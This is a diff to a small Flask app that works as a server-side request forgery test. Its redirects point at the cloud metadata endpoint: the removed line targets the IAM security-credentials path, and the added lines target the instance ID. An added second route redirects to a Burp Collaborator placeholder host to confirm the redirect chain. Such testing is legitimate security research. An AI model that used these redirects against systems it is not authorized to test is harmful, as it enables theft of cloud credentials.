@@ -4,8 +4,13 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    # Replace this with the internal IP or URL you want to redirect to
-    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', code=302)
+    # Step 1: First redirect to internal IP
+    return redirect('http://169.254.169.254/latest/meta-data/instance-id', 302)
 
+@app.route('/step2')
+def step2():
+    # If they follow THIS, full chain confirmed
+    return redirect('https://YOUR.burpcollaborator.net', 302)
+    
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
